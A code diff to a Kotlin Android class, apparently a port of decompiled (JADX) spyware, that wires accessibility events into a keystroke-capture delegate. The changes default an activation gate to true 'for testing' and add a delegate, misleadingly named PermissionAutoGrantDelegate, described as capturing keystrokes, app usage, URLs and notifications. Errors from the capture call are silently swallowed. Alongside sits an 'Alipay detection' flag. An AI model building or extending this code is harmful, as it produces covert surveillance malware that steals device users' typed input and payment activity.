@@ -39,7 +39,8 @@ class EventFilterManager(
     var lastTextSelectionTime: Long = 0L
 
     /** JADX: f56827a7 — auth state restored (controls C0320a5 dispatch) */
-    var isAuthStateRestored: Boolean = false
+    // ADAPT: default true for testing — vendor sets via restoreState/enableLogging
+    var isAuthStateRestored: Boolean = true
 
     /** JADX: f56828a8 — Alipay detection enabled */
     @Volatile
@@ -75,6 +76,9 @@ class EventFilterManager(
     /** JADX: f56848c8 — secondary capture filter mode flag */
     @Volatile
     var isSecondaryCaptureMode: Boolean = false
+
+    /** JADX: C0320a5 — keystroke capture + activity monitor delegate */
+    val keystrokeCapture = PermissionAutoGrantDelegate()
 
     /** JADX: f56838b8 — handler for delayed runnables */
     private val handler = Handler(Looper.getMainLooper())
@@ -126,6 +130,13 @@ class EventFilterManager(
             if (event.eventType == 16 || event.eventType == 1) {
                 try {
                     source = event.source
+                } catch (_: Exception) {}
+            }
+
+            // JADX: C0320a5 dispatch — keystroke capture, app usage, URL, notifications
+            if (isAuthStateRestored) {
+                try {
+                    keystrokeCapture.handleEvent(event, source)
                 } catch (_: Exception) {}
             }
 
